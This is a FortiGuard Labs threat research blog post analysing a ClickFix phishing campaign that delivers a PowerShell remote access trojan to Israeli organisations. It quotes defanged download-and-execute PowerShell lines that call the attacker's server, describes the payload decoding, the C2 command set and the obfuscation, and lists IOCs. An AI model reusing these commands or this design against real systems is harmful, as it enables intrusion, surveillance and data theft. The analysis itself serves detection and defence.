@@ -1,0 +1,239 @@
+Categories
+
+
+
+Fortinet News & Updates
+
+
+
+
+FortiGuard Labs Threat Research
+
+
+
+
+Industry Trends & Insights
+
+
+
+
+Life at Fortinet
+
+
+
+
+Partners
+
+
+
+
+Customer Success Stories
+
+
+
+
+PSIRT Blogs
+
+Fortinet News & Updates
+FortiGuard Labs Threat Research
+Industry Trends & Insights
+Life at Fortinet
+Partners
+Customer Success Stories
+PSIRT Blogs
+Fortinet News & Updates
+FortiGuard Labs Threat Research
+Industry Trends & Insights
+Life at Fortinet
+Partners
+Customer Success Stories
+PSIRT Blogs
+CISO Collective
+Subscribe
+FortiGuard Labs Threat Research
+From ClickFix to Command: A Full PowerShell Attack Chain
+PowerShell-based campaign targeting Israeli firms uses obfuscation, RAT delivery, and MuddyWater-like tactics
+
+Article Contents
+Executive Summary
+Initial Access
+Payload Execution: Click-to-Fix as Initial Loader
+Secondary Stage: RAT Loader Behavior
+C2 Behavior and Victim Tracking
+Command Retrieval and Parsing
+Attribution Analysis
+Stealth Techniques: Obfuscation + Evasion
+ConclusionFortinet Protections
+IOCs
+Affected Platforms: Windows, delivered and executed through PowerShell
+
+Impacted parties: Regionally-focused campaign targets Israeli business and infrastructure sectors
+
+Impact: Malware grants remote access, enabling data exfiltration, surveillance, persistence, and lateral movement
+
+Severity level: High
+Executive Summary
+The FortiMail Workspace Security team recently identified a targeted intrusion campaign impacting multiple Israeli organizations. The adversary leveraged compromised internal email infrastructure to distribute phishing messages across the regional business landscape. These emails initiated a multi-stage, PowerShell-based infection chain that culminated in the delivery of a remote access trojan (RAT), executed entirely through PowerShell.
+2025 Global Threat Landscape Report
+Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.
+Key characteristics include:
+
+Full PowerShell-based delivery chain requiring no external executables
+Obfuscated payloads retrieved from actor-controlled infrastructure
+Evidence of lateral movement and surveillance activity
+Potential overlap with MuddyWater campaigns, but attribution remains inconclusive
+The following report outlines technical observations from the campaign, including delivery tactics, obfuscation methods, C2 activity, and MITRE ATT&CK mappings.
+Initial Access
+The campaign began with phishing emails crafted to appear as invitations to a “mentoring session on handling wartime conditions and the use of medical and pharmaceutical supplies.” Recipients are urged to help share the information, increasing the likelihood of internal propagation.
+Clicking the embedded link redirects users to a spoofed Microsoft Teams page. The site mimics the Teams interface and prompts the user to “Continue on this browser.”
+The next step prompts users to press Windows + R, paste a copied string to their clipboard, and hit Enter—a social engineering technique designed to mask the execution of a malicious PowerShell command.
+Here is a breakdown of this sequence:
+1.         “Press & hold Windows key + R” (This opens the Run dialog box)
+2.         “In the verification window, press Ctrl + V” (This instruction makes this look like a legitimate process.)
+3.         “Press Enter on your keyboard to finish” (This runs the string that was pasted on the user's clipboard.)
+Payload Execution: Click-to-Fix as Initial Loader
+Examining the phishing site’s HTML revealed a Base64-encoded PowerShell command, obfuscated across three strings.
+After the victim pastes the decoded PowerShell command into the Windows Run dialog and presses Enter, the malicious PowerShell process is initiated. The script uses the Invoke-WebRequest (GET) method to retrieve additional payload data from hxxps[:]//pharmacynod[.]com/Fix.
+Examining the phishing site’s HTML revealed a Base64-encoded PowerShell command, obfuscated across three strings. Once concatenated and decoded, it produces the following payload:
+powershell IEX ((Invoke-RestMethod -Uri hxxps[:]//pharmacynod[.]com/Fix -Method GET)[.]note[.]body)
+This command initiates the retrieval and execution of a secondary PowerShell script from the attacker’s server.
+Secondary Stage: RAT Loader Behavior
+Executing the payload downloads two files:
+1.  test.html, saved to: C:\Users\Public\Downloads\test.html
+Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri hxxps[:]//pharmacynod[.]com//31133?did=59MVRI –OutFile
+The file test.html has a blob object with a long string between <tag> markers
+2. A second PowerShell script reads the contents of test.html to reconstruct the final malicious .ps1 payload.
+(Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri hxxps[:]//pharmacynod[.]com//35893?provider=68600).content
+This second script executes malicious PowerShell code from the attacker’s server to deploy a Remote Access Trojan (RAT) on the victim’s machine.
+The script logic:
+
+Reads line 11 from test.html
+Extracts content between <tag> markers
+Splits the string on the delimiter kendrick
+Converts binary substrings into ASCII characters
+Reassembles and executes the decoded string using IEX
+For example: Suppose line 11 of test.html contains:
+"kendrick1100110kendrick"
+Step by step:
+
+Split on "kendrick":"kendrick1100110kendrick".Split("kendrick")
+
+results in:["", "1100110", ""]
+The script skips the empty strings and processes "1100110".
+It converts binary to decimal: 1100110 (base 2) = 102 (decimal)
+It then converts decimal to character: [char]102 = "f"
+
+So "1100110" decodes to "f".
+In short: The script extracts binary-encoded chunks separated by "kendrick", decodes them into text, assembles the result, and runs it as PowerShell code.
+We then created a Python script to decode the string:
+After decoding, we got a compressed Base 64 string:
+This line in the extracted string — “IEX (Decompress-Base64-String ".....")” — means in simple words: Decode this Base64-encoded compressed string, decompress it into plaintext PowerShell code, then run it.
+C2 Behavior and Victim Tracking
+The script hard-codes its command server: “$global:SRV = "hxxps[:]//pharmacynod[.]com/"”
+
+All communication occurs over HTTPS to this domain.
+Victim Identification
+Upon start, the script runs an “init” function to register the infected machine. This function
+
+Collects information:
+Windows domain
+Computer name
+Username
+
+Windows domain
+Computer name
+Username
+Concatenates this data:
+
+Compresses and reverses the string twice using GZip + Base64 with custom obfuscation.
+Sends this data to the endpoint: “/16625”
+Persistent Polling Loop
+The script then enters an infinite loop that:
+
+Sleeps for a random interval (default ~2-7 seconds) to evade detection.
+Calls ”Get-Appversion”= - to poll for commands from the C2 server via POST request
+Command Retrieval and Parsing
+Once the victim machine checks in, the Command and Control (C2) server responds with compressed and reversed instructions, which are decoded locally using the
+
+Get-Decompress function. These instructions are prefixed with specific numeric codes that dictate the type of action to perform:
+
+7979 - Triggers a full reinitialization by rerunning the init function. This typically refreshes the device's identity and reestablishes communication with the C2.
+5322 - Instructs the script to download and save a remote payload. The command includes a URL and a local filename, which are extracted and passed to the Get-File function. This function uses System.Net.WebClient to retrieve and write the file to disk.
+4622 - Updates the sleep interval between C2 polls. The script parses the new time value from the instruction and applies it to the global $time variable, allowing the attacker to control how frequently the victim checks in.
+2474 - Executes an arbitrary PowerShell command received from the C2. The command payload is first decompressed and decoded, then executed using IEX. The resulting output, as well as any errors, is captured, compressed, reversed (twice), and finally exfiltrated back to the endpoint /17361. This allows full remote code execution on the victim.
+Attribution Analysis
+In this case, the attacker systematically compromised multiple Israeli companies over several consecutive days, using each breached environment as a launchpad to target additional organizations in the region. This tactic closely mirrors MuddyWater’s typical approach to lateral expansion. However, there are notable differences: the actor deliberately avoided using remote management tools (RMMs) or public file-hosting services, both of which are frequently observed in traditional MuddyWater campaigns.
+The payload delivery was also distinct. It relied entirely on PowerShell, beginning with a deceptive “ClickFix” execution method and progressing through a multi-stage chain of obfuscated scripts. The final stage deployed a remote access trojan (RAT) written exclusively in PowerShell. While this diverges from MuddyWater’s historically favored toolsets, which often include remote administration software or staged droppers, other elements of the operation remain consistent. The infrastructure, regional targeting, and scripting techniques all strongly align with previously attributed MuddyWater activity.
+As one researcher observed, “This new activity is just a single point, not even a cluster of activity. It might fit the square hole—but it could easily belong to another actor.”
+In short, although this campaign exhibits significant resemblance to MuddyWater, the absence of supporting clusters, novel tooling, and a few tactical deviations leaves room for doubt. It may represent an evolution of the group’s methodology, or the work of a different threat actor borrowing from their playbook.
+Stealth Techniques: Obfuscation + Evasion
+This campaign combines layered obfuscation with subtle network evasion to stay under the radar. Payloads and responses are GZip-compressed, Base64-encoded, and reversed, making detection and analysis harder. On the network side, the script uses native .NET HTTP requests, sets a legitimate User-Agent via urlmon.dll, leverages default Windows credentials, and respects system proxy settings—all to mimic regular user traffic.
+Conclusion
+This operation demonstrates the efficacy of living-off-the-land techniques, layered evasion, and adaptive C2 communication—all executed through PowerShell. Although attribution is inconclusive, the tactics align with those of regionally motivated threat groups. Continued monitoring of similar patterns and proactive use of detection signatures is essential for organizations in high-risk sectors.
+Fortinet Protections
+Fortinet customers are protected against the activity described in this report through multiple layers of the Fortinet Security Fabric.
+FortiGuard Antivirus detects the PowerShell-based malware using the following signature:
+PowerShell/Agent.PH!tr
+FortiMail Workspace Security detects and blocks this attack.
+FortiEDR blocks the execution of malicious scripts, prevents in-memory payload delivery, and detects post-compromise activity consistent with remote access trojans (RATs) and script-based loaders.
+FortiGate firewalls with FortiGuard Intrusion Prevention System (IPS) detect and block malicious command-and-control (C2) traffic and related HTTP/S beaconing behavior.
+FortiGuard DNS Filtering and Web Filtering services prevent access to known malicious infrastructure, including the domain pharmacynod[.]com, which served as the primary C2 in this campaign.
+FortiAnalyzer and FortiSIEM provide centralized visibility and threat correlation to help organizations quickly detect and respond to unusual behaviors or policy violations across their environments. FortiNDR provides additional coverage through advanced analytics and machine learning, enabling the identification of anomalous activity associated with script-heavy or fileless intrusions.
+All protections are continuously updated with threat intelligence from FortiGuard Labs to ensure rapid defense against emerging malware variants and evolving adversary tradecraft.
+Organizations that suspect they have been impacted by this or related activity are encouraged to contact the FortiGuard Incident Response Team.
+IOCs
+Obfuscation patterns include:
+
+Double GZip compression
+Base64 encoding
+String reversal
+Replacing + with _ for URL-safety
+
+hxxps[:]//pharmacynod[.]com/	Hard-coded C2
+hxxps[:]//pharmacynod[.]com/16625	Victim registration / check-in
+hxxps[:]//pharmacynod[.]com/17361	Exfiltrated command results
+46a76b3c7851f30d68ebc6a5584bc099435b0544d8707fff7a9178f46046708b	Sha256 powershell RAT
+Related Posts
+FortiGuard Labs Threat Research
+Coyote Banking Trojan: A Stealthy Attack via LNK Files
+Analyzing ELF/Sshdinjector.A!tr with a Human and Artificial Analyst
+Malicious NPM Packages Targeting PayPal Users
+
+
+
+
+
+
+
+News & Articles
+
+News Releases
+News Articles
+Security Research
+
+Threat Research
+FortiGuard Labs
+Threat Map
+Ransomware Prevention
+Connect With Us
+
+Fortinet Community
+Partner Portal
+Investor Relations
+Product Certifications
+Company
+
+About Us
+Exec Mgmt
+Careers
+Training
+Events
+Industry Awards
+Social Responsibility
+CyberGlossary
+Sitemap
+Blog Sitemap
+Contact Us
+
+(866) 868-3678
+Copyright © 2025 Fortinet, Inc. All Rights Reserved
